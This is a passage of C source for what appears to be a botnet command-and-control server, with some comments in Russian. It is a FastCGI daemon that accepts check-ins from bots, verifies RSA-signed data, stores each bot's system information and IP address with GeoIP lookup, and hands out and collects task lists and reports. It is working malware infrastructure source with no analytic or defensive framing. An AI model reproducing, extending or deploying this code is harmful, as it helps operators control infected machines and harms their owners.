                		--nrtApprox;
		       }
            		else {
                		++nrtApprox;
            		}
            		bitIndex = i % 7;
       	}

		*pNRT = nrtApprox;
	}
	
	*pDataLen = dataBuffer - (httpBody + 2048);
	
	return ERR_OK;
}

void* handler_knock_thread(void* arg)
{
	sigset_t sset;
	uint8_t* decodedData = NULL;
	pconfiguration_t pConfiguration = NULL;
	int err = ERR_MEMPOOL;
	uint16_t decodedLen;
	uint8_t* outData = NULL;
	uint32_t outSize;
	char* botId;
	int dataLen, realLen;
	char* httpHost;
	char* httpPostBody = NULL;
	uint32_t clientIp;
	int dataSize;
	int nrt;
	FCGX_Request* pRequest = (FCGX_Request*)arg;
	USE_PERF;

	sigemptyset(&sset);
	sigaddset(&sset, SIGQUIT);
	sigaddset(&sset, SIGTERM);
	sigaddset(&sset, SIGPIPE); 
	pthread_sigmask(SIG_BLOCK, &sset, 0);

	BEGIN_PERF;
	dataLen = atoi(FCGX_GetParam("CONTENT_LENGTH", pRequest->envp));
	botId = FCGX_GetParam("PATH_INFO", pRequest->envp);
	httpHost = FCGX_GetParam("HTTP_HOST", pRequest->envp);
	clientIp = (in_addr_t)inet_addr(FCGX_GetParam("REMOTE_ADDR", pRequest->envp));

	if (dataLen < POST_BODY_MIN_SIZE || botId == NULL || strlen(botId + 1) != BOTID_SIZE) {
		logger_warn("Illegal query");
		goto end1;
	}

	++botId;

	logger_info("Bot %s connected from %04x", botId, clientIp);

	httpPostBody = mempool_get(&gPostBodyPool);
	if (httpPostBody == NULL) {
		goto end1;
	}

	realLen = FCGX_GetStr(httpPostBody, dataLen, pRequest->in);

	if (realLen != dataLen) {
		logger_warn("Size of HTTP-body is incorrect");
		goto end1;
	}

	if (process_http_body(httpPostBody, realLen, &nrt, &decodedLen) != ERR_OK) {
		logger_warn("HTTP-body is not valid");
		goto end1;
	}

	decodedData = httpPostBody + 2048;

	END_PERF("Data preparation");

	do {
		if (logic_verify_bot_data(decodedData, decodedLen, &pConfiguration) != ERR_OK) {
			logger_error("Cannot verify bot\n\n");
			break;
		}
		decodedData += RSA_SIGN_SIZE;
		decodedLen -= RSA_SIGN_SIZE;
		if (nrt == NRT_SYSTEM_INFO) {
			// Записываем данные в базу
			if (logic_update_bot_info(botId, clientIp, decodedData, decodedLen, &outData, &outSize) != ERR_OK) {
				logger_error("Cannot update loader data for id: %.64s", botId);
				break;
			}
			
			logger_info("SYSTEM INFO qeury successfully handled for bot id: %.64s", botId);

			dataSize = BOTID_SIZE;
			// Отправляем клиенту ответ 
			
			if (outData != NULL) {
				dataSize += outSize;
			}

			FCGX_FPrintF(pRequest->out, "Content-type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", dataSize);

			FCGX_FPrintF(pRequest->out, botId);
			if (outData != NULL) {
				FCGX_PutStr(outData, (const char*)outSize, pRequest->out);
				mempool_release(&gBotInfoPool, outData);
			}
//			FCGX_FPrintF(pRequest->out, "Content-type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", BOTID_SIZE);
//			FCGX_FPrintF(pRequest->out, botId);
		}
		else if (nrt == NRT_TASKS_REQUEST) {			
			if (logic_check_tasks_for_bot(botId, clientIp, httpHost, decodedData, decodedLen, &outData) != ERR_OK) {
				logger_error("Cannot check tasks for id: %.64s", botId);
				break;
			}

			logger_info("TASKS REQUEST AND REPORT qeury successfully handled for bot id: %.64s", botId);
			
			dataSize = BOTID_SIZE;

			// Отправляем клиенту ответ (и если есть, то список задач в теле)
			if (outData != NULL) {
				dataSize += strlen((char*)(outData + gGlobalConfig.tasksPerConn * (BYTES_PER_TASK + BYTES_PER_MATRIX)));
			}

			FCGX_FPrintF(pRequest->out, "Content-type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", dataSize);

			FCGX_FPrintF(pRequest->out, botId);
			if (outData != NULL) {
				FCGX_FPrintF(pRequest->out, (char*)(outData + gGlobalConfig.tasksPerConn * (BYTES_PER_TASK + BYTES_PER_MATRIX)));
				mempool_release(&gTasksPool, outData);
			}
		}
		else if (nrt == NRT_TASKS_CONFIRM) {		
			if (logic_report_tasks_for_bot(botId, decodedData, decodedLen, &outData) != ERR_OK) {
				logger_error("Cannot check tasks for id: %.64s", botId);
				break;
			}

			logger_info("TASKS CONFIRM qeury successfully handled for bot id: %.64s", botId);

			dataSize = BOTID_SIZE;

			// Отправляем клиенту ответ (и если есть, то список задач в теле)
			if (outData != NULL) {
				dataSize += strlen((char*)(outData + gGlobalConfig.tasksPerConn * BYTES_PER_REPORT));
			}

			FCGX_FPrintF(pRequest->out, "Content-type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", dataSize);

			FCGX_FPrintF(pRequest->out, botId);
			if (outData != NULL) {
				FCGX_FPrintF(pRequest->out, (char*)(outData + gGlobalConfig.tasksPerConn * BYTES_PER_REPORT));
				mempool_release(&gTasksReportPool, outData);
			}
		}
		else if (nrt == NRT_TASKS_REPORT) {		
			if (logic_report_tasks_for_bot(botId, decodedData, decodedLen, &outData) != ERR_OK) {
				logger_error("Cannot check tasks for id: %.64s", botId);
				break;
			}

			logger_info("TASKS CONFIRM qeury successfully handled for bot id: %.64s", botId);

			dataSize = BOTID_SIZE;

			// Отправляем клиенту ответ (и если есть, то список задач в теле)
			if (outData != NULL) {
				dataSize += strlen((char*)(outData + gGlobalConfig.tasksPerConn * BYTES_PER_REPORT));
			}

			FCGX_FPrintF(pRequest->out, "Content-type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", dataSize);

			FCGX_FPrintF(pRequest->out, botId);
			if (outData != NULL) {
				FCGX_FPrintF(pRequest->out, (char*)(outData + gGlobalConfig.tasksPerConn * BYTES_PER_REPORT));
				mempool_release(&gTasksReportPool, outData);
			}
		}
		else {
			logger_warn("Unknown bot NRT: %d", nrt);
			break;
		}

		err = ERR_OK;
	} while (0);
	
	if (pConfiguration != NULL) {
		mempool_release(&gConfigurationPool, pConfiguration);
	}

end1:
	//if (err != ERR_OK) {
		//FCGX_FPrintF(pRequest->out, "\r\n");
	//}
	FCGX_Finish_r(pRequest);
	mempool_release(&gFcgiReqPool, pRequest);
	if (httpPostBody != NULL) {
		mempool_release(&gPostBodyPool, httpPostBody);
	}

	return NULL;
}

void print_usage()
{
	printf("\nVersion %d.%d\nUsage: ./handler <config_path> <pid_path> <lock_path>\n", MAJOR_HANDLER_VERSION, MINOR_HANDLER_VERSION);
	printf("\tconfig_path - absolute path to configuration file\n");
	printf("\tpid_path - absolute path to pid file\n");
	printf("\tlock_path - absolute path to lock file\n");
}

#define CONF_PATH argv[1]
#define PID_PATH argv[2]
#define LOCK_PATH argv[3]

int main(int argc, char** argv, char** envs)
{
	FILE* gFin;
	FILE* gFout;
	FILE* gFerr;
	FILE* pidFile;
	int lockFile;
	pid_t pid;
//	sigset_t sset;
//	int sig;
	struct stat st;
	char data[32];
	int isDaemon = 1;
	uint8_t *ptr;
	size_t sz;
	int sock;
	int rc;
	FCGX_Request* pRequest;
	pthread_t pThread;
	pthread_attr_t attributes;

	if (argc < 4) {
		fprintf(stderr, "Incorrect parameter list\n");
		print_usage();
		exit(1);
	}

	if (stat(argv[1], &st) != 0) {
		fprintf(stderr, "Path not exists: %s\n", argv[1]);
	}	

	if (argc == 4) {
		if ((pid = fork()) < 0) {
			logger_error("Cannot fork process");
			exit(1);
		}
		else if (pid != 0)
			exit(0);

		setsid();
		umask(0);

		gFin  = freopen("/dev/null", "r+", stdin);
		if (!gFin) {
			logger_error("Cannot attach stdin to /dev/null");
			return 1;
		}
		gFout = freopen("/dev/null", "r+", stdout);
		if (!gFout) {
			logger_error("Cannot attach stdout to /dev/null");
			return 1;
		}
		gFerr = freopen("/dev/null", "r+", stderr);
		if (!gFerr) {
			logger_error("Cannot attach stderr to /dev/null");
			return 1;
		}
//		if (chdir("/") != 0) {
//			logger_error("Cannot change path to /");
//			exit(1);
//		}
	}
	else if (strcmp(argv[4], "1") == 0) {
		isDaemon = 0;
	}

	if (logger_init(isDaemon))
		exit(1);

	if (isDaemon) {
		logger_info("handler became daemon");
	}

	memset(&gGlobalConfig, 0, sizeof(global_config_t));

	if (config_load(CONF_PATH, line_parser_conf, line_parser_conf_done, handleConfigParameter) != 0) {
		logger_error("Cannot read config %s", CONF_PATH);
		exit(1);
	}

	logger_info("PID file: %s", PID_PATH);
	logger_info("LOCK file: %s", LOCK_PATH);
	logger_info("SOCKET file: %s", gGlobalConfig.socketPath);
	logger_info("SYSLOG identifier: %s", gGlobalConfig.syslogIdent);
	logger_info("Log warnings: %d", gGlobalConfig.logWarnings);
	logger_info("Log infos: %d", gGlobalConfig.logInfos);
	logger_info("DB host: %s", gGlobalConfig.dbHost);
	logger_info("DB port: %d", gGlobalConfig.dbPort);
	logger_info("DB scheme name: %s", gGlobalConfig.dbName);
	logger_info("DB user login: %s", gGlobalConfig.dbUser);
	logger_info("DB user pwd: %s", gGlobalConfig.dbPassword);
	logger_info("GeoIp data file: %s", gGlobalConfig.geoipDataFile);

	lockFile = open(LOCK_PATH, O_RDWR | O_CREAT, 0640);
	if (lockFile < 0) {
		logger_error("Cannot open/create LOCK file: %s", LOCK_PATH);
		exit(1); // cannot open
	}
	if (lockf(lockFile, F_TLOCK, 0) < 0) {
		logger_error("Another instance of handler is running");
		exit(0); // can not lock
	}
	sprintf(data, "%d", getpid());
	write(lockFile, data, strlen(data)); /* record pid to lockfile */

	pidFile = fopen(PID_PATH, "wb");
	if (pidFile == NULL) {
		logger_error("Cannot create PID file: %s", PID_PATH);
		exit(1);
	}
	fprintf(pidFile, "%d", getpid());
	fclose(pidFile);

	if (FCGX_Init())
       	exit(1);

	if (db_init(gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize))
		exit(1);

	if (geoip_init()) {
		logger_error("Cannot initialize GeoIp");
		exit(1);
	}

	if (mempool_init(&gConfigurationPool, sizeof(configuration_t), gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize)) {
		exit(1);
	}
	gConfigurationPool.name = "CONFIGURATION_BLOCK";

	if (mempool_init(&gPostBodyPool, gGlobalConfig.httpPostBodySize, gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize)) {
		exit(1);
	}
	gPostBodyPool.name = "POST_BODY";
		
	if (mempool_init(&gFcgiReqPool, sizeof(FCGX_Request), gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize)) {
		exit(1);
	}
	gFcgiReqPool.name = "FCGI_REQUEST";

	if (mempool_init(&gShaHashPool, 20, gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize)) {
		exit(1);
	}
	gShaHashPool.name = "SHA_HASH";

	if (mempool_init(&gQueryPool, 1024, gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize)) {
		exit(1);
	}
	gQueryPool.name = "QUERY";

	// Размер элемента пула рассчитывается следующим образом:
	// (Максимум_байт_на_одно_задание + (Максимум_байт_на_одно_задание * 4) / 3) * gGlobalConfig.tasksPerConn 
	// Максимум_байт_на_одно_задание = 255 + 10 + 5 + 5 + 5 = 280 и 10 дополнительных байт про запас. Итого 390 + BYTES_PER_MATRIX.
	if (mempool_init(&gTasksPool, gGlobalConfig.tasksPerConn * (BYTES_PER_MATRIX + BYTES_PER_TASK + (BYTES_PER_TASK * 4) / 3), gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize)) {
		exit(1);
	}
	gTasksPool.name = "TASKS";

	if (mempool_init(&gBotInfoPool, 16, gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize)) {
		exit(1);
	}
	gTasksPool.name = "BOT_INFO";

	if (mempool_init(&gTasksReportPool, gGlobalConfig.tasksPerConn * (BYTES_PER_REPORT + (BYTES_PER_REPORT * 4) / 3), gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize)) {
		exit(1);
	}
	gTasksReportPool.name = "TASKS_REPORT";

	// Инициализируем rsa контекст

	rsa_init(&gRsaContext, RSA_PKCS_V15, 0);

	ptr = gPrivRSAKey;
		
	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.N, ptr, sz)) {
		exit(1);
	}
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.E, ptr, sz)) {
		exit(1);
	}
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.D, ptr, sz)) {
		exit(1);
	}
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.P, ptr, sz)) {
		exit(1);
	}
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.Q, ptr, sz)) {
		exit(1);
	}
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.DP, ptr, sz)) {
		exit(1);
	}
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.DQ, ptr, sz)) {
		exit(1);
	}
	ptr += sz;

	sz = *ptr++;
	if (mpi_read_binary(&gRsaContext.QP, ptr, sz)) {
		exit(1);
	}

	gRsaContext.len = (mpi_msb(&gRsaContext.N) + 7) >> 3;

	crc64_buildtable();

	sock = FCGX_OpenSocket(gGlobalConfig.socketPath, 1000);

	if (sock < 0) {
		logger_error("Cannot open listening socket");
		exit(1);
	}

	chmod(gGlobalConfig.socketPath, 0666);

	logger_info("Handler daemon started!");

	for ( ; ; ) {
		pRequest = mempool_get(&gFcgiReqPool);
		if (pRequest == NULL) {
			continue;
		}
		FCGX_InitRequest(pRequest, sock, 0);
		rc = FCGX_Accept_r(pRequest);
		if (rc < 0) {
			logger_warn("Failed to accept new FastCGI connection");
			mempool_release(&gFcgiReqPool, pRequest);
			continue;
		}

		pthread_attr_init(&attributes);
		if (pthread_attr_setdetachstate(&attributes, PTHREAD_CREATE_DETACHED) == 0) {
			rc = pthread_create(&pThread, &attributes, handler_knock_thread, (void*)pRequest);
			if (rc) {
				logger_warn("Failed to create new handler thread");
				FCGX_Finish_r(pRequest);
				mempool_release(&gFcgiReqPool, pRequest);
			}
		}
		pthread_attr_destroy(&attributes);
	}
	
	unlink(PID_PATH);
	unlink(LOCK_PATH);

	mempool_done(&gConfigurationPool);
	mempool_done(&gPostBodyPool);
	mempool_done(&gFcgiReqPool);
	mempool_done(&gShaHashPool);
	mempool_done(&gQueryPool);
	mempool_done(&gTasksPool);
	mempool_done(&gBotInfoPool);
	geoip_done();
	db_done();
	
	if (gGlobalConfig.socketPath != NULL)
	      	free(gGlobalConfig.socketPath);
	if (gGlobalConfig.syslogIdent != NULL)
		free(gGlobalConfig.syslogIdent);
	if (gGlobalConfig.dbHost != NULL)
	      	free(gGlobalConfig.dbHost);
	if (gGlobalConfig.dbName != NULL)
	      	free(gGlobalConfig.dbName);
	if (gGlobalConfig.dbUser != NULL)
	      	free(gGlobalConfig.dbUser);
	if (gGlobalConfig.dbPassword != NULL)
	      	free(gGlobalConfig.dbPassword);
	
	logger_done();

	return 0;
}
